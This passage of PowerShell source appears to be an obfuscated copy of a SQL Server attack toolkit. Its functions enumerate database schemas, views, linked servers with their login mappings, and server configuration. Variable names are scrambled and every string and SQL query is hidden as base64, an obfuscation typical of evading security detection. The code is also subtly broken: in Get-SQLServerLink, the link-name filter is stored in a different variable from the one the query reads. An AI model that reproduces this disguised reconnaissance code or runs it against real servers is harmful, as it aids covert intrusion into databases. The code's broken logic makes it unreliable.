                            $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${__/\/\/\/\_/====\}, ${____/==\_/\_/\_/\}, ${_/====\___/\____/}, ${_/=\_/=\_/=\_/=\/}, $_, ${___/===\/=\/=\___}, ${/==\/===\/==\/=\_})
                        }
                        else
                        {
                            $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${__/\/\/\/\_/====\}, ${____/==\_/\_/\_/\}, ${_/====\___/\____/}, ${_/=\_/=\_/=\_/=\/}, $_, ${___/===\/=\/=\___})
                        }
                    }
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAE4AbwAgAGMAbwBsAHUAbQBuAHMAIAB3AGUAcgBlACAAZgBvAHUAbgBkACAAdABoAGEAdAAgAG0AYQB0AGMAaABlAGQAIAB0AGgAZQAgAHMAZQBhAHIAYwBoAC4A')))
                }
            }
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBOAEQAIABTAEUAQQBSAEMASAAgAEQAQQBUAEEAIABCAFkAIABDAE8ATABVAE0ATgA=')))
            }
        }
        ${____/\/=\_/\/===\} | Invoke-Parallel -ScriptBlock ${____/\__/\_/=\__/} -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return ${_/=\/\_/=====\/\_}
    }
}
Function  Get-SQLDatabaseSchema
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Schema name.')]
        [string]$SchemaName,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select schemas from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = "Show database role based schemas. Hidden by default.")]
        [switch]$ShowRoleSchemas,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/====\/\/=\_/\__/} = New-Object -TypeName System.Data.DataTable
        if($SchemaName)
        {
            ${_/\_/==\_/==\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAB3AGgAZQByAGUAIABzAC4AbgBhAG0AZQAgAGwAaQBrAGUAIAAnACUAJABTAGMAaABlAG0AYQBOAGEAbQBlACUAJwA=')))
        }
        else
        {
            ${_/\_/==\_/==\/\_/} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        if($NoDefaults)
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        ${/=\_____/\__/=\/\} |
        % -Process {
            ${/====\/=\_/==\__/} = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARwByAGEAYgBiAGkAbgBnACAAUwBjAGgAZQBtAGEAcwAgAGYAcgBvAG0AIAB0AGgAZQAgACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQAgAGQAYQB0AGEAYgBhAHMAZQAuAC4ALgA=')))
            }
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFUAUwBFACAAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9ADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIAAgACcAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAnACAAYQBzACAAWwBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnACQASQBuAHMAdABhAG4AYwBlACcAIABhAHMAIABbAEkAbgBzAHQAYQBuAGMAZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEIAXwBOAEEATQBFACgAKQAgAEEAUwAgAFsARABhAHQAYQBiAGEAcwBlAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwAuAHMAYwBoAGUAbQBhAF8AaQBkACAAQQBTACAAWwBTAGMAaABlAG0AYQBJAGQAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwAuAG4AYQBtAGUAIABBAFMAIABbAFMAYwBoAGUAbQBhAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwAuAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkACAAQQBTACAAWwBPAHcAbgBlAHIASQBkAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFUAUwBFAFIAXwBOAEEATQBFACgAcwAuAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkACkAIABBAFMAIABbAE8AdwBuAGUAcgBOAGEAbQBlAF0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARgBSAE8ATQAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwB5AHMALgBzAGMAaABlAG0AYQBzACAAQQBTACAAcwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABKAE8ASQBOACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABbACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQBdAC4AWwBJAE4ARgBPAFIATQBBAFQASQBPAE4AXwBTAEMASABFAE0AQQBdAC4AWwBTAEMASABFAE0AQQBUAEEAXQAgAEEAUwAgAGkAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABPAE4AIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMALgBuAGEAbQBlACAAPQAgAGkALgBTAEMASABFAE0AQQBfAE4AQQBNAEUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB7AF8ALwBcAF8ALwA9AD0AXABfAC8APQA9AFwALwBcAF8ALwB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8AUgBEAEUAUgAgAEIAWQAgAHMALgBuAGEAbQBlADsA')))
            ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose
            ${/====\/\/=\_/\__/} = ${/====\/\/=\_/\__/} + ${/=\_____/\/\/=\__}
        }
    }
    End
    {
        if($ShowRoleSchemas){
            ${/====\/\/=\_/\__/} 
        }else{
            ${/====\/\/=\_/\__/} | Where SchemaId  -lt 1000
        }
    }
}
Function  Get-SQLView
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'View name.')]
        [string]$ViewName,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/=\/\_/\/===\/\/\} = New-Object -TypeName System.Data.DataTable
        if($ViewName)
        {
            ${/=\/\/\/\_/\_/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAB3AGgAZQByAGUAIAB0AGEAYgBsAGUAXwBuAGEAbQBlACAAbABpAGsAZQAgACcAJQAkAFYAaQBlAHcATgBhAG0AZQAlACcA')))
        }
        else
        {
            ${/=\/\/\/\_/\_/\_/} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARwByAGEAYgBiAGkAbgBnACAAdgBpAGUAdwBzACAAZgByAG8AbQAgAHQAaABlACAAZABhAHQAYQBiAGEAcwBlAHMAIABiAGUAbABvAHcAOgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        if($NoDefaults)
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        ${/=\_____/\__/=\/\} |
        % -Process {
            ${/====\/=\_/==\__/} = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQA=')))
            }
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFUAUwBFACAAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9ADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIAAgACcAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAnACAAYQBzACAAWwBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwAkAEkAbgBzAHQAYQBuAGMAZQAnACAAYQBzACAAWwBJAG4AcwB0AGEAbgBjAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFQAQQBCAEwARQBfAEMAQQBUAEEATABPAEcAIABhAHMAIABbAEQAYQB0AGEAYgBhAHMAZQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABUAEEAQgBMAEUAXwBTAEMASABFAE0AQQAgAGEAcwAgAFsAUwBjAGgAZQBtAGEATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVABBAEIATABFAF8ATgBBAE0ARQAgAGEAcwAgAFsAVgBpAGUAdwBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABWAEkARQBXAF8ARABFAEYASQBOAEkAVABJAE8ATgAgAGEAcwAgAFsAVgBpAGUAdwBEAGUAZgBpAG4AaQB0AGkAbwBuAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAFMAXwBVAFAARABBAFQAQQBCAEwARQAgAGEAcwAgAFsASQBzAFUAcABkAGEAdABhAGIAbABlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABDAEgARQBDAEsAXwBPAFAAVABJAE8ATgAgAGEAcwAgAFsAQwBoAGUAYwBrAE8AcAB0AGkAbwBuAF0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARgBSAE8ATQAgACAAIAAgAFsASQBOAEYATwBSAE0AQQBUAEkATwBOAF8AUwBDAEgARQBNAEEAXQAuAFsAVgBJAEUAVwBTAF0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB7AC8APQBcAC8AXAAvAFwALwBcAF8ALwBcAF8ALwBcAF8ALwB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABPAFIARABFAFIAIABCAFkAIABUAEEAQgBMAEUAXwBDAEEAVABBAEwATwBHACwAVABBAEIATABFAF8AUwBDAEgARQBNAEEALABUAEEAQgBMAEUAXwBOAEEATQBFAA==')))
            ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${/=\/\_/\/===\/\/\} = ${/=\/\_/\/===\/\/\} + ${/=\_____/\/\/=\__}
        }
    }
    End
    {
        ${/=\/\_/\/===\/\/\}
    }
}
Function  Get-SQLServerLink
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server link name.')]
        [string]$DatabaseLinkName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/====\/\_/=\_/==\} = New-Object -TypeName System.Data.DataTable
        if($DatabaseLinkName)
        {
            ${/=\__/==\___/\_/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABXAEgARQBSAEUAIABhAC4AbgBhAG0AZQAgAGwAaQBrAGUAIAAnACQARABhAHQAYQBiAGEAcwBlAEwAaQBuAGsATgBhAG0AZQAnAA==')))
        }
        else
        {
            ${_/==\/\/=\/\_/=\/} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFMARQBMAEUAQwBUACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnACQASQBuAHMAdABhAG4AYwBlACcAIABhAHMAIABbAEkAbgBzAHQAYQBuAGMAZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgBzAGUAcgB2AGUAcgBfAGkAZAAgAGEAcwAgAFsARABhAHQAYQBiAGEAcwBlAEwAaQBuAGsASQBkAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQAuAG4AYQBtAGUAIABBAFMAIABbAEQAYQB0AGEAYgBhAHMAZQBMAGkAbgBrAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABDAEEAUwBFACAAYQAuAFMAZQByAHYAZQByAF8AaQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAEgARQBOACAAMAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVABIAEUATgAgACcATABvAGMAYQBsACcADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATABTAEUAIAAnAFIAZQBtAG8AdABlACcADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATgBEACAAQQBTACAAWwBEAGEAdABhAGIAYQBzAGUATABpAG4AawBMAG8AYwBhAHQAaQBvAG4AXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AcAByAG8AZAB1AGMAdAAgAGEAcwAgAFsAUAByAG8AZAB1AGMAdABdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgBwAHIAbwB2AGkAZABlAHIAIABhAHMAIABbAFAAcgBvAHYAaQBkAGUAcgBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgBjAGEAdABhAGwAbwBnACAAYQBzACAAWwBDAGEAdABhAGwAbwBnAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwBMAG8AYwBhAGwATABvAGcAaQBuACcAIAA9ACAAQwBBAFMARQAgAGIALgB1AHMAZQBzAF8AcwBlAGwAZgBfAGMAcgBlAGQAZQBuAHQAaQBhAGwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAE4AIAAxACAAVABIAEUATgAgACcAVQBzAGUAcwAgAFMAZQBsAGYAIABDAHIAZQBkAGUAbgB0AGkAYQBsAHMAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBMAFMARQAgAGMALgBuAGEAbQBlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAE4ARAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAC4AcgBlAG0AbwB0AGUAXwBuAGEAbQBlACAAQQBTACAAWwBSAGUAbQBvAHQAZQBMAG8AZwBpAG4ATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgBpAHMAXwByAHAAYwBfAG8AdQB0AF8AZQBuAGEAYgBsAGUAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AaQBzAF8AZABhAHQAYQBfAGEAYwBjAGUAcwBzAF8AZQBuAGEAYgBsAGUAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AbQBvAGQAaQBmAHkAXwBkAGEAdABlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABGAFIATwBNACAAWwBNAGEAcwB0AGUAcgBdAC4AWwBzAHkAcwBdAC4AWwBTAGUAcgB2AGUAcgBzAF0AIABhAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABMAEUARgBUACAASgBPAEkATgAgAFsATQBhAHMAdABlAHIAXQAuAFsAcwB5AHMAXQAuAFsAbABpAG4AawBlAGQAXwBsAG8AZwBpAG4AcwBdACAAYgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAATwBOACAAYQAuAHMAZQByAHYAZQByAF8AaQBkACAAPQAgAGIALgBzAGUAcgB2AGUAcgBfAGkAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAATABFAEYAVAAgAEoATwBJAE4AIABbAE0AYQBzAHQAZQByAF0ALgBbAHMAeQBzAF0ALgBbAHMAZQByAHYAZQByAF8AcAByAGkAbgBjAGkAcABhAGwAcwBdACAAYwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAATwBOACAAYwAuAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkACAAPQAgAGIALgBsAG8AYwBhAGwAXwBwAHIAaQBuAGMAaQBwAGEAbABfAGkAZAANAAoAIAAgACAAIAAgACAAIAAgACQAewBfAC8APQA9AFwALwBcAC8APQBcAC8AXABfAC8APQBcAC8AfQA=')))
        ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/====\/\_/=\_/==\} = ${/====\/\_/=\_/==\} + ${/=\_____/\/\/=\__}
    }
    End
    {
        ${/====\/\_/=\_/==\}
    }
}
Function  Get-SQLServerConfiguration
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Nubmer of hosts to query at one time.')]
        [int]$Threads = 5,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_____/===\_/=====} = New-Object -TypeName System.Data.DataTable
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AaQBtAHUAbQA='))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQA='))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG4AZgBpAGcAXwB2AGEAbAB1AGUA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgB1AG4AXwB2AGEAbAB1AGUA'))))
        ${____/\/=\_/\/===\} = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            ${_/\/=\/=\/\/\____} = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + ${_/\/=\/=\/\/\____}
    }
    Process
    {
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + $_
    }
    End
    {
        ${____/\__/\_/=\__/} = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            if($DAC)
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }
            try
            {
                ${__/=\____/\__/==\}.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                }
                ${_/\_/\/=\/\/=\/\_} = 0
                ${_/\/===\/\/\/==\/} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
                if (${_/\/===\/\/\/==\/} -eq 1)
                {
                    if(-not $SuppressVerbose)
                    {
